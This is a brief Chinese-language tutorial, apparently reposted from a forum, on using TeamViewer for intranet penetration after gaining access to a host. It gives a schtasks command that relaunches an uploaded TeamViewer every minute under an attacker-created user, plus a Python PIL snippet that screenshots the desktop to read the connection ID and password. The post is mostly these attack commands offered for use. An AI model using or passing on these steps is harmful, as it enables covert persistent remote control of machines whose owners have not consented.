# Teamviewer内网穿透（二）

> 原文：[https://www.zhihuifly.com/t/topic/3456](https://www.zhihuifly.com/t/topic/3456)

# Teamviewer内网穿透（二）

上传一个单文件版本的teamviewer

再通过下面指令运行起来

```
schtasks /create /sc minute /mo 1 /tn “cat” /tr TV的路径  /ru 创建的用户名 /rp 创建的密码 
```

使用PIL截图获取连接ID密码：

```
from PIL import ImageGrab
im = ImageGrab.grab()
im.save('screenshot.png') 
```